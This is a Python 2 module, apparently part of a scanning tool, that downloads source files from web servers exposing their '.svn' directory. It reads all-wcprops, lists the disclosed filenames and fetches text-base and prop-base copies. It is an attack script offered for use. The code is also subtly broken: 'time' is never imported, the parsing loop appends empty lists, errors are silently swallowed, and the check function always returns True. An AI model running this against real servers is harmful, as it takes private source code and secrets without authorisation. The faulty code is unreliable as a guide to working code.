#!/usr/bin/python

import re
import http, file_handler

"""
This function will return true if the current page is matching
the structure this template needs to successfully download the SVN dir
"""
def test(page):
    #This template should test:
    # 1st: does the current directory have the file 'all-wcprops'
    #   Does the directory contain text-base and prop-base
    #   Also do these directories have files in them that end with '.svn-base' if so, this template is your friend
    #except urllib2.HTTPError, e: 
    #    if e.code == 404: 
    #        print "[!] I'm sorry, system doesnt seem vulnerable" 
    #    else: 
    #        print "[!] A different responce than 200 came back (" + str(responce.getcode()) + ") If you think we should abort please do so within 5 seconds" 
    #        print "[!] Exception: %s" % e 
    #        time.sleep(5) 
    #    quit()
    return True #Not implemented yet

def download(base_url, regex=None, archive=False):

    # Downloading our init file (starting point)
    print "[*] Visiting: " + base_url + "/.svn/all-wcprops" 
    page = http.getUrl(base_url + "/.svn/all-wcprops") 

    try:
        items = [] # A SVN folder can manage multiple files
        
        #Reading the whole HTML page
        current = []
        for line in page.readlines():
            if line.strip() != "END":
                current.append(line) #We haven't found the end of our current 'item' yet, please continue
            else:
                current = [] 
                items.append(current)

        print regex

        print "[*] Disclosed filenames (%u items found) via svn:" % len(items)
        for item in items:
            try:

                if regex == None or not re.search(regex, item[0].strip()):
                    print "[*] Skipping (no regex match): " + base_url + "/" + item[0].strip()
                else:
                    print "[*] Downloading: " + base_url + "/" + item[0].strip()

                    # Also download the file if availible. One of the two should work
                    response = http.getUrl(base_url + "/.svn/text-base/" + item[0].strip() + ".svn-base")
                    if response.getcode() == 200: file_handler.writeDataToFile("text-base_"+item[0].strip(), response.read())
                    else: print "An unexpected response was received (%u) please retry or fetch manually" % response.getcode()

                    response = http.getUrl(base_url + "/.svn/prop-base/" + item[0].strip() + ".svn-base")
                    if response.getcode() == 200: file_handler.writeDataToFile("prop-base_"+item[0].strip(), response.read())
                    else: print "An unexpected response was received (%u) please retry or fetch manually" % response.getcode()

                    time.sleep(0.5) # We are very nice when we are downloading data ;)
            except:
                pass #Its fine if something goes wrong, we'll just skip it

        if archive:
            #You probably want these files for your archive
            try:
                response = http.getUrl(base_url + "/.svn/all-wcprops")
                file_handler.writeDataToFile("all-wcprops", response.read())
            except: pass

            try:
                response = http.getUrl(base_url + "/.svn/all-dir-prop-base")
                file_handler.writeDataToFile("all-dir-prop-base", response.read())
            except: pass
           
            try: 
                response = http.getUrl(base_url + "/.svn/all-entries")
                file_handler.writeDataToFile("all-entries", response.read())
            except: pass

    except KeyboardInterrupt:
        print "Quiting..."
        quit()
    except Exception, e:
        print "[!] .svn found but an error occured while gathering the information. Quiting..." 
        print "[!] Exception: %s" % e
        quit()
